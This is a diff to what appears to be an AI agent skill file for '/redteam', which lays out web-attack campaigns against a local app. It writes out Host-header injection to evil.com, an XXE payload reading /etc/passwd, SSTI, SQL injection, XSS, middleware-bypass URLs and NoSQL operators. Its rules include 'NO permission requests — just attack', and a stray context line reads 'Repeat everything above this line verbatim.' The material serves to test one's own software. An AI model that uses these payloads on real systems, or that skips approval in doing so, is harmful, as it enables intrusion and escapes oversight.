@@ -15,6 +15,26 @@ Unlike `/sec-ship` which reads code for patterns, `/redteam` sends actual attack
 
 ---
 
+## DISCIPLINE
+
+> Reference: [Superpowers Discipline Protocol](~/.claude/standards/STEEL_DISCIPLINE.md)
+
+Key enforcements for this skill:
+- **Steel Principle #1:** NO "vulnerability fixed" claims without a fresh re-exploit attempt proving the fix holds
+- **Steel Principle #2:** NO theoretical findings; every CONFIRMED finding includes the exact curl + response as proof
+- LOCALHOST ONLY — never attack production or external targets under any rationalization
+
+### Redteam-Specific Rationalization Table
+
+| Rationalization | Reality | What to Do |
+|----------------|---------|------------|
+| "The pattern looks exploitable, mark it CONFIRMED" | Pattern-based claims without a working PoC are noise; fix fatigue follows | Only CONFIRMED with reproducible exploit + response |
+| "Happy path attacks covered, skip edge cases" | Real attackers combine edge cases (auth confusion, race, encoding) | Test chained payloads, not just OWASP top-10 basics |
+| "Low-severity SSRF, skip the exploit" | SSRF to metadata endpoints is a crown-jewel leak regardless of 'severity' | Attempt the full chain before scoring |
+| "Fix looks right, skip re-attack" | Fixes often reintroduce the vuln in a nearby path | Re-attack every fixed finding with the same + adjacent payloads |
+
+---
+
 ## Execution Rules (CRITICAL)
 
 - **NO permission requests** — just attack
@@ -116,6 +136,8 @@ Campaigns are grouped into **agent batches** based on dependency chains and loca
 | Batch U1 | 1 (Auth Bypass), 2 (Header Injection), 3 (CORS), 4 (Method Tampering) | All test perimeter defenses — independent of each other | Yes (with U2) |
 | Batch U2 | 5 (Injection), 6 (Path Traversal), 7 (Error Disclosure), 8 (Rate Limiting) | All test input handling — independent of each other | Yes (with U1) |
 | Batch U3 | 9 (Scraping Abuse), 10 (File Upload), 23 (DNS Rebinding), 24 (HTTP Smuggling), 25 (Cache Poisoning), 26 (GraphQL), 27 (SSE) | Advanced attacks — some need recon from U1/U2 results | After U1+U2 |
+| Batch U4 | 35 (Host Header), 36 (Timing), 37 (Content-Type), 38 (CSP), 39 (SSTI), 40 (JWT Secret), 41 (Error Taxonomy) | Advanced unauth + code review — independent | After U3 |
+| Phase 2.5 | Browser-based XSS/DOM verification | Requires Playwright MCP + findings from U1-U4 | After U4 |
 
 **Phase 3 — Authenticated (4 batches, max 2 parallel):**
 
@@ -1646,19 +1668,300 @@ done
 
 ---
 
+### Campaign 35: Host Header Injection & Cache Key Poisoning
+
+**Objective:** Manipulate the `Host` header to poison password reset links, cache entries, or redirect destinations.
+
+**Attacks:**
+
+```bash
+# 35.1 Host header override — does the app use Host for link generation?
+curl -s -D - http://localhost:$PORT/ \
+  -H "Host: evil.com" | grep -i "evil.com"
+
+# 35.2 X-Forwarded-Host injection
+curl -s -D - http://localhost:$PORT/ \
+  -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"
+
+# 35.3 Host header in password reset (if reset endpoint exists)
+curl -s -X POST http://localhost:$PORT/api/auth/reset-password \
+  -H "Host: evil.com" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@test.com"}'
+# Check: does the reset email link point to evil.com?
+
+# 35.4 Duplicate Host headers
+curl -s -D - http://localhost:$PORT/ \
+  -H "Host: localhost:$PORT" -H "Host: evil.com"
+```
+
+**Expected:** App ignores manipulated Host, uses configured base URL
+**CONFIRMED if:** `evil.com` appears in response body, headers, or generated links
+
+---
+
+### Campaign 36: Timing Side-Channel Analysis
+
+**Objective:** Detect information leakage through response timing differences.
+
+**Attacks:**
+
+```bash
+# 36.1 User enumeration via login timing
+# Time a valid email vs invalid email
+VALID_TIME=$(curl -s -o /dev/null -w "%{time_total}" -X POST http://localhost:$PORT/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@steelmotion.dev","password":"wrong"}')
+
+INVALID_TIME=$(curl -s -o /dev/null -w "%{time_total}" -X POST http://localhost:$PORT/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"nonexistent_user_12345@fake.com","password":"wrong"}')
+
+# Compare: >50ms difference = timing leak
+echo "Valid email: ${VALID_TIME}s | Invalid email: ${INVALID_TIME}s"
+
+# 36.2 Resource existence via timing
+# Time a valid vs invalid resource ID
+for id in "real-known-id" "00000000-0000-0000-0000-000000000000"; do
+  TIME=$(curl -s -o /dev/null -w "%{time_total}" http://localhost:$PORT/api/resource/$id)
+  echo "$id: ${TIME}s"
+done
+
+# 36.3 Password complexity timing
+# If the app does password validation sequentially, longer passwords take longer to reject
+for len in 1 4 8 16 32; do
+  PASS=$(python3 -c "print('a'*$len)")
+  TIME=$(curl -s -o /dev/null -w "%{time_total}" -X POST http://localhost:$PORT/api/auth/login \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"test@test.com\",\"password\":\"$PASS\"}")
+  echo "Length $len: ${TIME}s"
+done
+```
+
+**Expected:** Consistent timing regardless of input validity (<50ms variance)
+**CONFIRMED if:** >100ms timing difference between valid and invalid inputs — enables blind enumeration
+
+---
+
+### Campaign 37: Content-Type Confusion & Parser Differential
+
+**Objective:** Bypass validation by sending data in unexpected formats.
+
+**Attacks:**
+
+```bash
+# 37.1 URL-encoded body to JSON endpoint
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "name=test&email=test@test.com&role=admin"
+
+# 37.2 Multipart to JSON endpoint
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -F "name=test" -F "email=test@test.com" -F "role=admin"
+
+# 37.3 XML body to JSON endpoint (XXE attempt)
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>'
+
+# 37.4 Plain text body
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: text/plain" \
+  -d '{"name":"test","email":"test@test.com"}'
+
+# 37.5 No Content-Type header
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -d '{"name":"test","email":"test@test.com"}'
+
+# 37.6 Double Content-Type
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d '{"name":"test"}'
+```
+
+**Expected:** Non-JSON content types rejected (400/415)
+**CONFIRMED if:** Server parses non-JSON body and processes it, or XML entity expansion succeeds
+
+---
+
+### Campaign 38: CSP Policy Strength Audit
+
+**Objective:** Analyze Content Security Policy for bypasses via allowed domains.
+
+```bash
+# 38.1 Fetch CSP header
+CSP=$(curl -s -D - http://localhost:$PORT/ | grep -i "content-security-policy")
+echo "CSP: $CSP"
+
+# 38.2 Check for unsafe-inline
+echo "$CSP" | grep -i "unsafe-inline" && echo "CONFIRMED: unsafe-inline allows XSS"
+
+# 38.3 Check for unsafe-eval
+echo "$CSP" | grep -i "unsafe-eval" && echo "CONFIRMED: unsafe-eval allows code execution"
+
+# 38.4 Check for wildcard sources
+echo "$CSP" | grep -E "\*\." && echo "WARNING: wildcard domain sources"
+
+# 38.5 Check for data: URI in script-src
+echo "$CSP" | grep "data:" && echo "WARNING: data: URI allowed"
+
+# 38.6 Check allowed domains for known CSP bypass hosts
+# JSONP endpoints on allowed CDNs can bypass CSP
+BYPASS_HOSTS=("cdn.jsdelivr.net" "cdnjs.cloudflare.com" "accounts.google.com" "www.google.com/recaptcha")
+for host in "${BYPASS_HOSTS[@]}"; do
+  echo "$CSP" | grep -i "$host" && echo "WARNING: $host allows JSONP-based CSP bypass"
+done
+
+# 38.7 Missing CSP entirely
+[ -z "$CSP" ] && echo "CONFIRMED: No CSP header — all script sources allowed"
+```
+
+**Expected:** Strict CSP with nonce or hash, no unsafe-inline/eval, no wildcards
+**CONFIRMED if:** Missing CSP, unsafe-inline present, or bypassable domains in allowlist
+
+---
+
+### Campaign 39: Server-Side Template Injection (SSTI)
+
+**Objective:** Test if user input reaches a template engine.
+
+```bash
+SSTI_PAYLOADS=(
+  '{{7*7}}'                          # Jinja2, Nunjucks
+  '${7*7}'                           # Java EL, template literals
+  '<%= 7*7 %>'                       # ERB, EJS
+  '#{7*7}'                           # Ruby, Pug
+  '{7*7}'                            # Smarty
+  '{{constructor.constructor("return 7*7")()}}'  # Angular/sandbox escape
+)
+
+for payload in "${SSTI_PAYLOADS[@]}"; do
+  RESPONSE=$(curl -s -X POST http://localhost:$PORT/api/contact \
+    -H "Content-Type: application/json" \
+    -d "{\"name\":\"$payload\",\"message\":\"test\"}")
+  # Check if 49 appears in the response (7*7 = 49)
+  echo "$RESPONSE" | grep "49" && echo "CONFIRMED: SSTI with payload: $payload"
+done
+```
+
+**Expected:** Template syntax treated as literal strings
+**CONFIRMED if:** `49` appears in response (template expression was evaluated)
+
+---
+
+### Campaign 40: JWT Secret Brute-Force (Offline)
+
+**Objective:** Test if the JWT signing secret is weak/guessable. This is entirely offline computation — no network requests.
+
+```bash
+# 40.1 Extract a valid JWT from an auth response (if obtainable from prior campaigns)
+# Or craft a known JWT from the app's login flow
+
+# 40.2 Test common weak secrets against the JWT signature
+# This is OFFLINE — just HMAC computation, no requests to any server
+WEAK_SECRETS=(
+  "secret" "password" "123456" "jwt_secret" "my-secret"
+  "your-256-bit-secret" "supersecretkey" "changeme" "default"
+  "node_env" "development" "test" "HS256"
+)
+
+# Code review: check for hardcoded JWT secrets
+grep -rn "JWT_SECRET\|jwt.*secret\|sign(\|verify(" --include="*.ts" --include="*.env*" . | grep -v node_modules | head -20
+
+# Check .env.example for weak default secrets
+grep -i "secret\|jwt\|token\|key" .env.example 2>/dev/null
+```
+
+**Expected:** JWT secret is long, random, from environment variable with no weak default
+**CONFIRMED if:** Hardcoded secret found in code, or `.env.example` contains a real-looking secret
+
+---
+
+### Campaign 41: Systematic Error Taxonomy
+
+**Objective:** Trigger every type of error and catalog what each reveals.
+
+```bash
+# 41.1 404 error — what does it expose?
+curl -s http://localhost:$PORT/api/this-does-not-exist-at-all
+
+# 41.2 405 error — wrong method
+curl -s -X DELETE http://localhost:$PORT/api/contact
+
+# 41.3 400 error — malformed JSON
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" -d '{invalid json'
+
+# 41.4 413 error — oversized payload
+dd if=/dev/zero bs=1M count=10 2>/dev/null | curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" -d @- --max-time 5
+
+# 41.5 500 error — force server error
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -d '{"name":{"toString":null}}'
+
+# 41.6 Trigger unhandled rejection
+curl -s "http://localhost:$PORT/api/tasks?id=undefined"
+
+# For each error: catalog what's revealed
+# CRITICAL leaks: stack traces, file paths, DB schemas, framework versions, env vars
+# SAFE responses: generic "Internal Server Error" with no details
+```
+
+**Expected:** All errors return generic messages, no stack traces, no internal paths
+**CONFIRMED if:** ANY error response contains file paths, line numbers, SQL queries, or framework internals
+
+---
+
+## Phase 2.5: Browser-Based Attack Verification (Playwright MCP)
+
+**Purpose:** Verify client-side attacks (XSS, DOM manipulation) in a REAL browser, not just by inspecting API responses. An XSS payload in an API response isn't confirmed until it executes in a browser.
+
+**Requires:** Playwright MCP (configured in `.mcp.json`).
+
+**For each stored XSS finding from Campaign 3:**
+
+1. Navigate to the page where the payload would render via `browser_navigate`
+2. Use `browser_evaluate` to check if the payload executed:
+   ```javascript
+   // Check if alert was called (overridden before navigation)
+   window.__xss_fired = false;
+   window.alert = () => { window.__xss_fired = true; };
+   ```
+3. Navigate to the page with the stored payload
+4. Check: `browser_evaluate` → `window.__xss_fired`
+5. Screenshot the evidence → `.redteam-reports/evidence/RT-XXX-browser.png`
+
+**For DOM-based XSS patterns:**
+1. Use `browser_evaluate` to inject payloads into `location.hash`, `location.search`, `document.referrer`
+2. Check if the DOM reflects the payload unsanitized
+3. Check for `innerHTML` assignments from URL parameters
+
+**For clickjacking verification:**
+1. Create a simple HTML page that iframes the target
+2. Use `browser_navigate` to load the framing page
+3. Verify if the target loads in the iframe (should be blocked by X-Frame-Options)
+
+**IMPORTANT:** This phase is optional if Playwright MCP is not available. If unavailable, mark browser-verifiable findings as "API-confirmed, browser-unverified" in the report.
+
+---
+
 ## Phase 3: Authenticated Attack Campaigns (Internal Testing)
 
 The perimeter is tested. Now get INSIDE the house and test what authenticated users can break. This is where most real-world vulnerabilities hide in well-secured apps.
 
 ### Agent Batching (Phase 3)
 
-Campaigns are split into 4 agent batches per the AGENT ORCHESTRATION section above:
+Campaigns are split into 5 agent batches per the AGENT ORCHESTRATION section above:
 
 - **Phase 3.0** (orchestrator or haiku agent): Test user provisioning — MUST complete before any batch
 - **Batch A1** (Campaigns 11-14): Core authenticated attacks — runs in parallel with A2
 - **Batch A2** (Campaigns 15-18): Security boundary attacks — runs in parallel with A1
 - **Batch A3** (Campaigns 19-20, 28-31): Complex attacks — runs after A1+A2 complete
 - **Batch A4** (Campaigns 32-34): Meta-attacks — runs LAST (needs ALL prior findings)
+- **Batch A5** (Campaigns 42-48): Advanced authenticated attacks — runs after A3
 - **Phase 3.11** (orchestrator or haiku agent): Test user cleanup — runs after ALL batches
 
 Each batch agent receives: `DEV_PORT`, attack surface map, `TOKEN_A`, `TOKEN_B`, `USER_A_ID`, `USER_B_ID`, `VICTIM_RESOURCE_IDS`, and its campaign instructions. Each agent writes evidence to disk and returns < 500 token summary.
@@ -2767,8 +3070,233 @@ rm -f /tmp/evil.* /tmp/redteam-* 2>/dev/null
 **Update Report:**
 1. Append to Progress Log: `| [HH:MM] | Phase 3.11 | Cleanup | Test users deleted ✅ |` (or ⚠️ if manual cleanup needed)
 2. If cleanup failed, add entry to `## Manual Items` with user IDs that need manual deletion
-3. Update Status: `🔴 IN PROGRESS — Phase 4: Auto-Fix`
+3. Update Status: `🔴 IN PROGRESS — Batch A5: Advanced Authenticated`
 4. **Write to disk**
+
+---
+
+### Batch A5: Advanced Authenticated Campaigns (42-48)
+
+**Runs after Phase 3.11 cleanup of test users from Batches A1-A4.** Re-provision fresh test users for these campaigns (same process as Phase 3.0).
+
+### Campaign 42: Session Management & Cookie Rotation
+
+**Objective:** Test if sessions are properly managed across auth state changes.
+
+```bash
+# 42.1 Does session token change after login?
+# Get token before login
+PRE_LOGIN_COOKIES=$(curl -s -c - http://localhost:$PORT/api/auth/session)
+# Login
+curl -s -X POST http://localhost:$PORT/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'$USER_A_EMAIL'","password":"'$USER_A_PASS'"}' -c -
+# Compare cookies — session ID should be different
+POST_LOGIN_COOKIES=$(curl -s -c - http://localhost:$PORT/api/auth/session \
+  -H "Authorization: Bearer $TOKEN_A")
+echo "Pre-login: $PRE_LOGIN_COOKIES"
+echo "Post-login: $POST_LOGIN_COOKIES"
+
+# 42.2 Does session survive after password change?
+# Old token should be invalidated after password change
+
+# 42.3 Concurrent session limit
+# Login with same credentials from 5 different "devices" (different User-Agent strings)
+for ua in "Chrome/120" "Firefox/119" "Safari/17" "Edge/120" "Mobile/1"; do
+  curl -s -X POST http://localhost:$PORT/api/auth/login \
+    -H "Content-Type: application/json" \
+    -H "User-Agent: $ua" \
+    -d '{"email":"'$USER_A_EMAIL'","password":"'$USER_A_PASS'"}'
+done
+# Are all sessions valid? Should there be a limit?
+
+# 42.4 Session fixation — can you set a session cookie BEFORE auth and have it persist?
+curl -s http://localhost:$PORT/ -b "session=attacker-controlled-value" -c -
+# Then login — does the app use the attacker's session ID?
+```
+
+**Expected:** Session rotates after auth changes, old tokens invalidated, concurrent sessions limited
+**CONFIRMED if:** Pre-login session persists post-login (fixation), or old tokens work after password change
+
+### Campaign 43: Next.js Server Action Exploitation
+
+**Objective:** Call Server Actions directly via POST, bypassing client-side validation.
+
+```bash
+# 43.1 Discover Server Actions — look for "use server" directives
+grep -rn '"use server"' --include="*.ts" --include="*.tsx" app/ | head -20
+
+# 43.2 For each Server Action found, call it directly via POST
+# Server Actions are invoked via POST to the page URL with special headers
+# The action ID is derived from the function name
+
+# 43.3 Send invalid data that client-side validation would reject
+# (Server Actions that trust client validation are vulnerable)
+curl -s -X POST http://localhost:$PORT/contact \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Next-Action: [action-id-from-source]" \
+  -d "name=<script>alert(1)</script>&email=not-an-email&phone='; DROP TABLE users;--"
+
+# 43.4 Call Server Action without auth (if it should require auth)
+curl -s -X POST http://localhost:$PORT/dashboard \
+  -H "Next-Action: [action-id]" \
+  -d "data=anything"
+```
+
+**Expected:** Server Actions validate input independently of client, require auth if needed
+**CONFIRMED if:** Server Action accepts invalid data that the form UI would reject, or runs without auth
+
+### Campaign 44: Cookie Jar & Storage Abuse
+
+**Objective:** Test what happens when cookie/storage limits are exceeded.
+
+```bash
+# 44.1 Cookie overflow — set 50+ cookies
+COOKIE_STRING=""
+for i in $(seq 1 60); do
+  COOKIE_STRING="${COOKIE_STRING}cookie${i}=value${i}; "
+done
+curl -s -D - http://localhost:$PORT/ -b "$COOKIE_STRING" | head -20
+# Does the app crash? Does auth break? Does it corrupt existing cookies?
+
+# 44.2 Oversized cookie value
+BIG_VALUE=$(python3 -c "print('A'*8000)")
+curl -s -D - http://localhost:$PORT/ -b "session=$BIG_VALUE" | head -20
+
+# 44.3 Special characters in cookie values
+curl -s -D - http://localhost:$PORT/ -b 'session=test"; HttpOnly; Secure; Path=/' | head -20
+```
+
+**Expected:** App handles oversized/malformed cookies gracefully
+**CONFIRMED if:** App crashes, auth corrupts, or cookie injection succeeds
+
+### Campaign 45: Next.js Middleware Bypass Patterns
+
+**Objective:** Test if middleware can be bypassed via specific URL patterns.
+
+```bash
+# 45.1 Trailing slash bypass
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/admin/
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/admin
+
+# 45.2 Case sensitivity bypass
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/Admin
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/ADMIN
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/aDmIn
+
+# 45.3 URL encoding bypass
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/%61dmin
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/adm%69n
+
+# 45.4 Double encoding bypass
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/%2561dmin
+
+# 45.5 Path parameter injection
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/admin;.css
+curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/admin%00.css
+
+# 45.6 Middleware matcher gap — test paths NOT in the matcher
+# Read middleware.ts to find the matcher config
+grep -A 10 "export const config" middleware.ts 2>/dev/null
+# Test paths that should be protected but might not match the regex
+
+# 45.7 _next/data bypass — SSR data routes may skip middleware
+curl -s http://localhost:$PORT/_next/data/BUILD_ID/admin.json
+```
+
+**Expected:** All bypass attempts return 401/403
+**CONFIRMED if:** Any encoded, cased, or suffixed URL returns 200 to a protected route
+
+### Campaign 46: Deserialization & Type Confusion
+
+**Objective:** Send unexpected data types where specific types are expected.
+
+```bash
+# 46.1 Array where object expected
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -d '[{"name":"test"}]'
+
+# 46.2 Number where string expected
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -d '{"name":12345,"email":67890}'
+
+# 46.3 Boolean where string expected
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -d '{"name":true,"email":false}'
+
+# 46.4 Nested object where string expected
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" \
+  -d '{"name":{"$gt":""},"email":{"$regex":".*"}}'
+
+# 46.5 Empty object and empty array
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" -d '{}'
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" -d '[]'
+
+# 46.6 Extremely deep nesting (100 levels)
+DEEP=$(python3 -c "print('{\"a\":'*100 + '\"leaf\"' + '}'*100)")
+curl -s -X POST http://localhost:$PORT/api/contact \
+  -H "Content-Type: application/json" -d "$DEEP" --max-time 5
+```
+
+**Expected:** Type mismatches rejected by Zod/validation, deep nesting rejected
+**CONFIRMED if:** Server accepts wrong types, crashes on deep nesting, or NoSQL-style operators work
+
+### Campaign 47: Next.js API Route Method Enforcement
+
+**Objective:** Test if API routes properly restrict HTTP methods.
+
+```bash
+# For each API route, test every method
+for route in $(cat .redteam-reports/evidence/recon.md 2>/dev/null | grep "^|" | awk -F'|' '{print $3}' | tr -d ' ' | grep "^/api"); do
+  for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
+    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:$PORT$route)
+    # Only report if an unexpected method returns 200
+    echo "$method $route → $STATUS"
+  done
+done
+
+# Test: does the app export only the methods it intends?
+# Next.js returns 405 for unhandled methods if route.ts doesn't export them
+# But some apps use catch-all handlers that accept everything
+```
+
+**Expected:** Only exported methods return 200, others return 405
+**CONFIRMED if:** Unexpected method returns 200 (e.g., DELETE on a read-only endpoint)
+
+### Campaign 48: Dependency Confusion via Import Analysis (Code Review)
+
+**Objective:** Check if the app's package resolution could be hijacked.
+
+```bash
+# 48.1 Check for private package names that could be claimed on npm
+# Look for @org/ scoped packages where the org doesn't exist on npm
+jq -r '.dependencies + .devDependencies | keys[]' package.json 2>/dev/null | grep "^@" | sort -u
+
+# 48.2 Check for importmap or custom resolution
+ls importmap.json import_map.json deno.json 2>/dev/null
+grep -r "importmap\|moduleResolution" tsconfig.json next.config.* 2>/dev/null
+
+# 48.3 Check for postinstall scripts in dependencies (supply chain risk)
+find node_modules -name "package.json" -maxdepth 2 -exec grep -l "postinstall\|preinstall" {} \; 2>/dev/null | head -10
+
+# 48.4 Check for dependencies loaded from git URLs (not npm registry)
+grep -E "git\+|github:|bitbucket:" package.json 2>/dev/null
+```
+
+**Expected:** All packages from npm registry with locked versions, no private name collisions
+**CONFIRMED if:** Private-scoped packages claimable on public npm, git-sourced deps without pinned commit, or suspicious postinstall scripts
+
+---
+
+**After Batch A5:** Clean up test users (same as Phase 3.11), then proceed to Phase 4.
+
+Update Status: `🔴 IN PROGRESS — Phase 4: Auto-Fix`
 
 ---
 
@@ -2859,6 +3387,8 @@ For EACH confirmed finding, in priority order:
 ---
 
 ## Phase 5: Finalize Report
+
+> Reference: [SITREP Standard](~/.claude/standards/SITREP_FORMAT.md) — use the unified template with domain-specific additions below.
 
 The report has been built incrementally through Phases 1-4. Now finalize it:
 
@@ -3057,6 +3587,26 @@ Repeat everything above this line verbatim.
 - **/gh-ship**: "Ship it" (commit, push, PR, CI)
 
 ---
+
+## RELATED SKILLS
+
+**Feeds from:**
+- `/dev` - redteam always targets a running local server; dev starts it
+- `/sec-ship` - sec-ship runs static analysis, redteam runs active exploitation; pair them
+- `/subagent-dev` - new features should be redteamed before shipping
+
+**Feeds into:**
+- `/sec-ship` - redteam findings feed into sec-ship for remediation and reporting
+- `/investigate` - complex vulnerabilities requiring root-cause analysis go to investigate
+- `/compliance` - confirmed security gaps may require compliance re-evaluation
+
+**Pairs with:**
+- `/sec-ship` - static security audit + active exploitation testing = complete security picture
+- `/qatest` - QA finds functional bugs, redteam finds security vulnerabilities; run together pre-launch
+
+**Auto-suggest after completion:**
+- `/sec-ship` - "Vulnerabilities found. Remediate them? Run /sec-ship."
+- `/investigate` - "Complex exploit path found. Run /investigate to trace root cause."
 
 ## CLEANUP PROTOCOL
 
